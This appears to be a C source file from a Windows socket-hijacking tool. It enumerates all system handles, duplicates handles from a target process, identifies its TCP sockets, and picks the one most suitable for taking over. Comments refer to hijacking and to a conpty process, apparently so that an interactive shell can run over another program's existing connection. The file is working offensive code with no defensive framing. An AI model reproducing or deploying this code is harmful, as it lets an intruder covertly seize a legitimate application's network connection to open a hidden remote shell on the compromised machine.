#include "globals.h"
#include "hijacking.h"


bool IsSocketHandle(HANDLE hHandle)
{
    bool bRes = false;
    HMODULE hMod = LoadLibrary(_T("ntdll.dll"));
    if (hMod)
    {
        NtQueryObjectPtr NtQueryObject = (NtQueryObjectPtr)GetProcAddress(hMod, "NtQueryObject");
        if (NtQueryObject)
        {
            ULONG OutSize = 0;
            NTSTATUS NtStatus = NtQueryObject(hHandle, ObjectTypeInformation, NULL, 0, &OutSize);
            BYTE* pBuffer = (BYTE*)malloc(OutSize * sizeof(ULONG));
            if (pBuffer != NULL)
            {
                ZeroMemory(pBuffer, OutSize * sizeof(ULONG));
                PPUBLIC_OBJECT_TYPE_INFORMATION TypeInfo = (PPUBLIC_OBJECT_TYPE_INFORMATION)&pBuffer[0];
                ULONG InSize = OutSize;
                NtStatus = NtQueryObject(hHandle, ObjectTypeInformation, TypeInfo, InSize, &OutSize);
                if (NT_SUCCESS(NtStatus))
                {
                    wchar_t* wcsTypeName = (wchar_t*)malloc((size_t)TypeInfo->TypeName.Length + 2); // TypeInfo->TypeName.Length is in number of bytes
                    ASSERT(wcsTypeName != NULL); // NULL => not enough memory space
                    if (wcsTypeName != NULL) // this just to remove the warning
                    {
                        ZeroMemory(wcsTypeName, (size_t)TypeInfo->TypeName.Length + 2);
                        memcpy(wcsTypeName, TypeInfo->TypeName.Buffer, TypeInfo->TypeName.Length);
                        if (0 == wcscmp(L"File", wcsTypeName))
                        {
                            free(pBuffer);
                            pBuffer = NULL;
                            NtStatus = NtQueryObject(hHandle, ObjectNameInformation, NULL, 0, &OutSize);
                            pBuffer = (BYTE*)malloc(OutSize * sizeof(ULONG));
                            if (pBuffer != NULL)
                            {
                                ZeroMemory(pBuffer, OutSize * sizeof(ULONG));
                                PPUBLIC_OBJECT_NAME_INFORMATION NameInfo = (PPUBLIC_OBJECT_NAME_INFORMATION)&pBuffer[0];
                                InSize = OutSize;
                                NtStatus = NtQueryObject(hHandle, ObjectNameInformation, NameInfo, InSize, &OutSize);
                                if (NT_SUCCESS(NtStatus))
                                {
                                    if (0 == wcscmp(L"\\Device\\Afd", NameInfo->Name.Buffer))
                                    {
                                        bRes = true;
                                    }
                                    free(pBuffer);
                                }
                            }
                        }
                        free(wcsTypeName);
                        wcsTypeName = NULL;
                    }
                }
            }
        }
        FreeLibrary(hMod);
    }
    return bRes;
}

int compare_sockets(const void* a, const void* b)
{
    int iRes = 0;
    const SOCKET_BYTESIN* sockin1 = (const SOCKET_BYTESIN*)a;
    const SOCKET_BYTESIN* sockin2 = (const SOCKET_BYTESIN*)b;

    if (sockin1->bytes_in < sockin2->bytes_in)
        iRes = -1;
    else if (sockin1->bytes_in > sockin2->bytes_in)
        iRes = 1;
    return iRes;
}

SOCKET_LIST* FilterAndOrderSocketsByBytesIn(SOCKET_LIST* pDupSocks)
{
    SOCKET_LIST* pSocks = (SOCKET_LIST*)malloc(sizeof(SOCKET_LIST));
    if (pSocks != NULL)
    {
        ZeroMemory(pSocks, sizeof(SOCKET_LIST));
        SOCKET_BYTESIN* pSocketsBytesIn = (SOCKET_BYTESIN*)malloc(sizeof(SOCKET_BYTESIN) * pDupSocks->dwLength);
        DWORD dwActualNbSocks = 0;
        if (pSocketsBytesIn != NULL)
        {
            ZeroMemory(pSocketsBytesIn, sizeof(SOCKET_BYTESIN) * pDupSocks->dwLength);
            SOCKET_NODE* pNode = pDupSocks->pHead;
            while (pNode != NULL && dwActualNbSocks < pDupSocks->dwLength)
            {
                SOCKET hSock = pNode->hSock;
                TCP_INFO_v0* pSockInfo = NULL;
                if (!GetSocketTcpInfo(hSock, &pSockInfo))
                {
                    __try
                    {
                        closesocket(hSock);
                    }
                    __except (EXCEPTION_EXECUTE_HANDLER)
                    {

                    }
                }
                else
                {
                    if (pSockInfo != NULL)
                    {
                        if (pSockInfo->State == TCPSTATE_SYN_RCVD || pSockInfo->State == TCPSTATE_ESTABLISHED)
                        {
                            SOCKET_BYTESIN sockBytesIn = { 0 };
                            sockBytesIn.sock = hSock;
                            sockBytesIn.bytes_in = pSockInfo->BytesIn;
                            pSocketsBytesIn[dwActualNbSocks] = sockBytesIn;
                            dwActualNbSocks++;
                        }
                        else
                        {
                            __try
                            {
                                closesocket(hSock);
                            }
                            __except (EXCEPTION_EXECUTE_HANDLER)
                            {

                            }
                        }
                        free(pSockInfo);
                    }                    
                }
            }
            if (dwActualNbSocks > 0)
            {
                if (dwActualNbSocks > 1)
                {
                    // ordering for fewer bytes received by the sockets we have a higher chance to get the proper socket
                    qsort(pSocketsBytesIn, dwActualNbSocks, sizeof(SOCKET_BYTESIN), compare_sockets);
                }
                for (unsigned int i = 0; i < dwActualNbSocks; ++i)
                {
                    SOCKET_NODE* pSockNode = (SOCKET_NODE*)malloc(sizeof(SOCKET_NODE));
                    if (pSockNode != NULL)
                    {
                        ZeroMemory(pSockNode, sizeof(SOCKET_NODE));
                        pSockNode->hSock = pSocketsBytesIn[i].sock;
                        if (pSocks->pHead == NULL)
                            pSocks->pHead = pSockNode;
                        if (pSocks->pTail != NULL)
                            pSocks->pTail->pNext = pSockNode;
                        pSocks->pTail = pSockNode;
                        ++pSocks->dwLength;
                    }
                }
            }
        }
        
    }
    return pSocks;
}

bool GetSocketTcpInfo(SOCKET hSock, TCP_INFO_v0** tcpInfoOut)
{
    ASSERT(tcpInfoOut != NULL);
    int iRes = -1;
    DWORD tcpInfoVersion = 0;
    DWORD bytesReturned = 0;
    DWORD tcpInfoSize = sizeof(TCP_INFO_v0);
    TCP_INFO_v0* pTcpInfo = (TCP_INFO_v0*)malloc(sizeof(TCP_INFO_v0));
    iRes = WSAIoctl(hSock, SIO_TCP_INFO, &tcpInfoVersion, sizeof(tcpInfoVersion), pTcpInfo, tcpInfoSize, &bytesReturned, NULL, NULL);
    if (iRes == 0)
    {
        *tcpInfoOut = (TCP_INFO_v0*)pTcpInfo;
    }
    return iRes == 0;
}

SOCKET DuplicateSocketFromHandle(HANDLE hHandle)
{
    SOCKET hSock = INVALID_SOCKET;
    SOCKET hDuplicatedSocket = INVALID_SOCKET;
    WSAPROTOCOL_INFO wsaProtocolInfo;
    memset(&wsaProtocolInfo, 0, sizeof(WSAPROTOCOL_INFO));
    int status = WSADuplicateSocket((SOCKET)hHandle, GetCurrentProcessId(), &wsaProtocolInfo);
    if (status == 0)
    {
        // we need an overlapped socket for the conpty process but we don't need to specify the WSA_FLAG_OVERLAPPED flag here because it will be ignored (and automatically set) by WSASocket() function if we set the WSAPROTOCOL_INFO structure and if the original socket has been created with the overlapped flag.
        hDuplicatedSocket = WSASocket(wsaProtocolInfo.iAddressFamily, wsaProtocolInfo.iSocketType, wsaProtocolInfo.iProtocol, &wsaProtocolInfo, 0, 0);
        if (hDuplicatedSocket != INVALID_SOCKET)
        {
            hSock = hDuplicatedSocket;
            __try
            {
                CloseHandle(hHandle); // cleaning 
            }
            __except (EXCEPTION_EXECUTE_HANDLER)
            {

            }
        }
    }
    return hSock;
}

SOCKET_LIST* DuplicateSocketsFromHandles(HANDLE_LIST* pHandleList)
{
    SOCKET_LIST* pDupedSockets = (SOCKET_LIST*)malloc(sizeof(SOCKET_LIST));
    if (pDupedSockets != NULL)
    {
        ZeroMemory(pDupedSockets, sizeof(SOCKET_LIST));
        HANDLE_NODE* pNode = pHandleList->pHead;
        while (pNode != NULL)
        {
            SOCKET hDupSock = DuplicateSocketFromHandle(pNode->hHandle);
            if (hDupSock != INVALID_SOCKET)
            {
                SOCKET_NODE* pSockNode = (SOCKET_NODE*)malloc(sizeof(SOCKET_NODE));
                if (pSockNode != NULL)
                {
                    ZeroMemory(pSockNode, sizeof(SOCKET_NODE));
                    pSockNode->hSock = hDupSock;
                    if (pDupedSockets->pHead == NULL)
                        pDupedSockets->pHead = pSockNode;
                    if (pDupedSockets->pTail != NULL)
                        pDupedSockets->pTail->pNext = pSockNode;
                    pDupedSockets->pTail = pSockNode;
                    ++pDupedSockets->dwLength;
                }
            }
            pNode = pNode->pNext;
        }
    }
    return pDupedSockets;
}


UINT g_CurrentIndex = 0;

DWORD WINAPI ThreadProc(LPVOID lParams)
{
    THREAD_PARAMS* pThreadParams = (THREAD_PARAMS*)lParams;

    for (g_CurrentIndex; g_CurrentIndex < pThreadParams->pSysHandleInformation->dwCount; )
    {
        WaitForSingleObject(pThreadParams->hStartEvent, INFINITE);
        ResetEvent(pThreadParams->hStartEvent);
        pThreadParams->bStatus = false;
        SYSTEM_HANDLE sh = pThreadParams->pSysHandleInformation->handles[g_CurrentIndex];
        g_CurrentIndex++;
        if (sh.dwProcessId == pThreadParams->dwProcessId)
        {
            HANDLE hDup = (HANDLE)sh.wValue;
            HANDLE hProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, sh.dwProcessId);
            if (hProcess)
            {
                bool bRes = DuplicateHandle(hProcess, (HANDLE)sh.wValue, GetCurrentProcess(), &hDup, 0, FALSE, DUPLICATE_SAME_ACCESS) == TRUE;
                if (bRes != FALSE)
                {
                    if (IsSocketHandle(hDup))
                    {
                        pThreadParams->bStatus = true;
                    }
                    else
                    {
                        __try
                        {
                            CloseHandle(hDup); // cleaning 
                        }
                        __except (EXCEPTION_EXECUTE_HANDLER)
                        {

                        }
                    }
                }
                CloseHandle(hProcess);
            }
        }
        SetEvent(pThreadParams->hFinishedEvent);
    }
    return 0;
}

SOCKET_LIST* GetTargetProcessSockets(DWORD dwProcessId)
{
    HRESULT hRes = E_FAIL;
    HANDLE hTargetProcess = NULL;
    SOCKET_LIST* pSocks = NULL;
    HANDLE_LIST lstDupHandles;
    ZeroMemory(&lstDupHandles, sizeof(HANDLE_LIST));
    hTargetProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, dwProcessId);
    if (hTargetProcess == NULL)
    {
        WriteStdErr("ERROR: Cannot open target process for DuplicateHandle access\r\n");
    }
    else
    {
        CloseHandle(hTargetProcess);
        // Get the list of all handles in the system
        PSYSTEM_HANDLE_INFORMATION pSysHandleInformation = (PSYSTEM_HANDLE_INFORMATION)malloc(sizeof(SYSTEM_HANDLE_INFORMATION));
        DWORD size = sizeof(SYSTEM_HANDLE_INFORMATION);
        DWORD needed = 0;
        HMODULE hModule = LoadLibrary(_T("ntdll.dll"));
        if (hModule)
        {
            NtQuerySystemInformationPtr NtQuerySystemInformation = (NtQuerySystemInformationPtr)GetProcAddress(hModule, "NtQuerySystemInformation");
            if (NULL == NtQuerySystemInformation)
            {
                WriteStdErr("ERROR: GetProcAddress failed for NtQuerySystemInformation\r\n");
            }
            else
            {
                NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, pSysHandleInformation, size, &needed);
                if (!NT_SUCCESS(status))
                {
                    free(pSysHandleInformation);
                    if (0 == needed)
                    {
                        WriteStdErr("ERROR: NtQuerySystemInformatino failed\r\n");
                    }
                    else
                    {
                        // The previously supplied buffer wasn't enough.
                        size = needed;
                        BYTE* rawSystemHandleInformation =  (BYTE*)malloc(size);
                        pSysHandleInformation = (PSYSTEM_HANDLE_INFORMATION)rawSystemHandleInformation;
                        status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, pSysHandleInformation, size, &needed);
                        if (!NT_SUCCESS(status))
                        {
                            // some other error so quit.
                            free(rawSystemHandleInformation);
                        }
                        else
                        {
                            // No error so far
                            // Start thread for NtQueryObject call
                            g_CurrentIndex = 0;
                            THREAD_PARAMS ThreadParams = { 0 };
                            ThreadParams.dwProcessId = dwProcessId;
                            ThreadParams.pSysHandleInformation = pSysHandleInformation;
                            ThreadParams.hStartEvent = CreateEvent(0, TRUE, FALSE, 0);
                            ThreadParams.hFinishedEvent = CreateEvent(0, TRUE, FALSE, 0);
                            HANDLE hThread = NULL;
                            while (g_CurrentIndex < pSysHandleInformation->dwCount)
                            {
                                HANDLE hCurrentHandle = (HANDLE)pSysHandleInformation->handles[g_CurrentIndex].wValue;
                                if (!hThread)
                                {
                                    hThread = CreateThread(0, 0, ThreadProc, &ThreadParams, 0, 0);
                                }
                                if (hThread)
                                {
                                    ASSERT(ThreadParams.hStartEvent != INVALID_HANDLE_VALUE && ThreadParams.hStartEvent != NULL);
                                    ASSERT(ThreadParams.hFinishedEvent != INVALID_HANDLE_VALUE && ThreadParams.hFinishedEvent != NULL);
                                    ResetEvent(ThreadParams.hFinishedEvent);
                                    SetEvent(ThreadParams.hStartEvent);
                                    if (WAIT_TIMEOUT == WaitForSingleObject(ThreadParams.hFinishedEvent, 100))
                                    {
                                        char csError[256];
                                        ZeroMemory(csError, 256);
                                        sprintf_s(csError, 256, "Query hang for handle %p", hCurrentHandle);
                                        WriteStdErr(csError);
                                        TerminateThread(hThread, 0);
                                        CloseHandle(hThread);
                                        hThread = NULL;
                                    }
                                    else
                                    {
                                        if (ThreadParams.bStatus)
                                        {
                                            HANDLE_NODE* pHandleNode = (HANDLE_NODE*)malloc(sizeof(HANDLE_NODE));
                                            ZeroMemory(pHandleNode, sizeof(HANDLE_NODE));
                                            pHandleNode->hHandle = hCurrentHandle;
                                            if (lstDupHandles.pHead == NULL)
                                                lstDupHandles.pHead = pHandleNode;
                                            if (lstDupHandles.pTail != NULL)
                                                lstDupHandles.pTail->pNext = pHandleNode;
                                            lstDupHandles.pTail = pHandleNode;
                                            ++lstDupHandles.dwLength;
                                        }
                                    }
                                }
                                else
                                    break;
                            }
                            free(rawSystemHandleInformation);
                            rawSystemHandleInformation = NULL;
                            pSysHandleInformation = NULL;
                            if (lstDupHandles.dwLength > 0)
                            {
                                SOCKET_LIST* pDupSockets = DuplicateSocketsFromHandles(&lstDupHandles);
                                if (pDupSockets->dwLength > 0)
                                {
                                    pSocks = FilterAndOrderSocketsByBytesIn(pDupSockets);
                                    SOCKET_NODE* pNode = pDupSockets->pHead;
                                    while (pNode != NULL)
                                    {
                                        SOCKET_NODE* pNext = pNode->pNext;
                                        free(pNode);
                                        pNode = pNext;
                                    }
                                }
                                free(pDupSockets);

                                HANDLE_NODE* pNode = lstDupHandles.pHead;
                                while (pNode != NULL)
                                {
                                    HANDLE_NODE* pNext = pNode->pNext;
                                    free(pNode);
                                    pNode = pNext;
                                }
                            }
                        }
                    }
                }
                FreeModule(hModule);
            }
            FreeLibrary(hModule);
        }
        else
        {
            WriteStdErr("ERROR: Failed to get module ntdll.dll\r\n");
        }
    }
    return pSocks;
}


bool IsSocketOverlapped(SOCKET hSock)
{
    bool bRes = false;
    HMODULE hMod = LoadLibrary(_T("ntdll.dll"));
    if (hMod != NULL && hMod != INVALID_HANDLE_VALUE)
    {
        NtCreateEventPtr NtCreateEvent = GetProcAddress(hMod, "NtCreateEvent");
        if (NtCreateEvent != NULL)
        {
            HANDLE hNtEvent = NULL;
            int ntStatus = -1;
            SOCKET_CONTEXT contextData;
            memset(&contextData, 0, sizeof(SOCKET_CONTEXT));
            ntStatus = NtCreateEvent(&hNtEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, false);
            if (NT_SUCCESS(ntStatus) && hNtEvent != NULL && hNtEvent != INVALID_HANDLE_VALUE)
            {
                NtDeviceIoControlFilePtr NtDeviceIoControlFile = GetProcAddress(hMod, "NtDeviceIoControlFile");
                if (NtDeviceIoControlFile != NULL)
                {
                    IO_STATUS_BLOCK IOSB;
                    ntStatus = NtDeviceIoControlFile((HANDLE)hSock, hNtEvent, NULL, NULL, &IOSB, IOCTL_AFD_GET_CONTEXT, NULL, 0, &contextData, sizeof(contextData));
                    // Wait for Completion 
                    if (ntStatus == NTSTATUS_PENDING)
                    {
                        WaitForSingleObject(hNtEvent, INFINITE);
                        ntStatus = IOSB.Status;
                    }
                    CloseHandle(hNtEvent);

                    if (NT_SUCCESS(ntStatus))
                    {
                        if ((contextData.SharedData.CreationFlags & WSA_FLAG_OVERLAPPED) != 0) bRes = true;
                    }
                    
                }
            }
        }
    }
    return bRes;
}

SOCKET DuplicateTargetProcessSocket(DWORD dwProcessId, bool* pOverlappedSocket)
{
    *pOverlappedSocket = false;
    SOCKET hSock = INVALID_SOCKET;
    SOCKET_LIST* pSocks = GetTargetProcessSockets(dwProcessId);
    if (pSocks->dwLength > 0)
    {
        SOCKET_NODE* pNode = pSocks->pHead;
        while (pNode != NULL)
        {
            if (IsSocketOverlapped(pNode->hSock))
            {
                // we prioritize the hijacking of Overlapped sockets
                hSock = pNode->hSock;
                *pOverlappedSocket = true;
                break;
            }
            pNode = pNode->pNext;
        }
        // no Overlapped sockets found, We try with the first socket
        if (hSock == INVALID_SOCKET) 
        {
            WriteStdErr("DEBUG: No overlapped sockets found. Trying to return also non-overlapped sockets...\r\n");
            if(pSocks->pHead != NULL)
                hSock = pSocks->pHead->hSock;
        }
        // close duplicated socket handle not returned to avoid leaking handles.
        pNode = pSocks->pHead;
        while (pNode != NULL)
        {
            SOCKET_NODE* pNext = pNode->pNext;
            if (pNode->hSock != hSock) closesocket(pNode->hSock);
            free(pNode);
            pNode = pNext;
        }
        free(pSocks);
        pSocks = NULL;
    }
    return hSock;
}

bool SetSocketBlockingMode(SOCKET hSock, int iMode)
{
    // iMode == 1 => non blocking else blocking
    ULONG ulNonBlocking = iMode == 1 ? 1 : 0;
    int iResult = ioctlsocket(hSock, FIONBIO, &ulNonBlocking);
    if (iResult != 0)
        WriteStdErr("ERROR: ioctlsocket failed\r\n");
    return iResult == 0;
}